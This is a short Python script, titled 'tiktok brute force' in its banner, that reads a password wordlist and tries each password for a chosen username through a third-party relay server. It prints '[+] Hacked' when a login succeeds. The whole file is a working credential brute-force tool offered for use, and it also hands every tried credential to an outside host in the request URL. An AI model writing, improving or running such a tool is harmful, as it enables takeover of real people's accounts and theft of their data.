import requests
import os

def check_login(username, password):
    url = f'https://jftv.pythonanywhere.com/tik/{username}:{password}'
    response = requests.get(url)

    if 'Done login' in response.text:
        print(f'[+] Hacked >> {username}:{password}')
    elif 'secure' in response.text:
        print(f'[?] Secure >> {username}:{password}')
    elif 'error pass' in response.text:
        print(f'[-] Wrong password >> {username}:{password}')
    elif 'user not found' in response.text:
        print(f'[&] Not found >> {username}')
    elif 'There is pressure on the server' in response.text:
        print('[!] There is pressure on the server')
    elif 'This website is hosted by PythonAnywhere,' in response.text:
        print('[!] Make sure the server is running and the developer hasn\'t shut it down')
    elif 'closed' in response.text:
        print(response.text)

def read_file():
    file_name = input('\n[+] WORDLIST PATH: ')
    username = input('[+] Enter the username: ')
    
    try:
        with open(file_name, 'r') as file:
            print('\n\t ━━━━━━━━━━━━ Started ━━━━━━━━━━━━\n')
            for line in file:
                parts = line.strip().split(":")
                if len(parts) > 1:
                    password = parts[1]
                    check_login(username, password)
    except FileNotFoundError:
        print(f'\n[-] File "{file_name}" not found!\n')
        read_file()

def main():
    print("""

  _   _ _    _        _      _                _        __                   
 | | (_) |  | |      | |    | |              | |      / _|                  
 | |_ _| | _| |_ ___ | | __ | |__  _ __ _   _| |_ ___| |_ ___  _ __ ___ ___ 
 | __| | |/ / __/ _ \| |/ / | '_ \| '__| | | | __/ _ \  _/ _ \| '__/ __/ _ /
 | |_| |   <| || (_) |   <  | |_) | |  | |_| | ||  __/ || (_) | | | (_|  __/
  \__|_|_|\_||__\___/|_|\_\ |_.__/|_|   \__,_|\__\___|_| \___/|_|  \___\___|
                                                                            
                                                                            
    """)
    
    file_type = input("""
    1) [ Kali linux / Windows ]
    2) [ Iphone / Android ]

    Enter your device type: """)
    
    if file_type.lower() not in ['k', '1']:
        print("\n[-] Invalid choice for device type. Exiting...\n")
        return
    
    os.system("cls" if os.name == "nt" else "clear")
    read_file()

if __name__ == "__main__":
    main()